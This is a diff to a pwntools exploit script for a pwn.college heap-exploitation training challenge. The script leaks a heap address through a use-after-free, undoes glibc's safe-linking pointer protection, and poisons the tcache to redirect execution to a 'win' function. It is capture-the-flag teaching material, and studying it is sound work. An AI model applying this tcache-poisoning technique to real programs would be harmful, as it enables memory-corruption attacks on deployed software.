@@ -1,6 +1,7 @@
-# Sus Sequence Safety
+# Dynamic Allocator Misuse - Sus Sequence Safety (Easy)
+# https://pwn.college/program-security/dynamic-allocator-misuse/level-17-0
 import pwn
-from dojotool import find_challenge
+from dojotool import find_challenge, protect_ptr
 from dojotool.pwntool import tee
 
 
@@ -25,22 +26,19 @@ def one_round(io: pwn.process):
     elf.address = addrof_main - elf.symbols["main"]
     addrof_win = elf.symbols["win"]
 
-    def protect_ptr(pos: int, ptr: int) -> int:
-        return (pos >> 12) ^ ptr
+    def read_byte(idx):
+        io.sendline(b"puts %d" % idx)
+        io.recvuntil(b"Data: ")
+        return pwn.u64(io.recvline(False).ljust(8, b"\x00")[:8])
 
-    io.sendline(b"malloc 0 16")
-    io.sendline(b"free 0")
-    io.sendline(b"puts 0")
-    io.recvuntil(b"Data: ")
-    heap = pwn.u64(io.recvline(False).ljust(8, b"\x00")[:8]) << 12  # page aligned
-
-    pwn.info(f"addrof_heap: {hex(heap)}")
     pwn.info(f"addrof_rbp:  {hex(addrof_rbp)}")
     pwn.info(f"addrof_win:  {hex(addrof_win)}")
     io.sendline(b"malloc 0 16")
     io.sendline(b"malloc 1 16")
     io.sendline(b"free 0")
     io.sendline(b"free 1")
+    heap = read_byte(0) << 12  # last 12 bits is unknown, but irrelevant
+    pwn.info(f"addrof_heap: {hex(heap)}")
 
     io.sendline(b"scanf 1")
     io.sendline(pwn.p64(protect_ptr(heap, addrof_local_stack)))
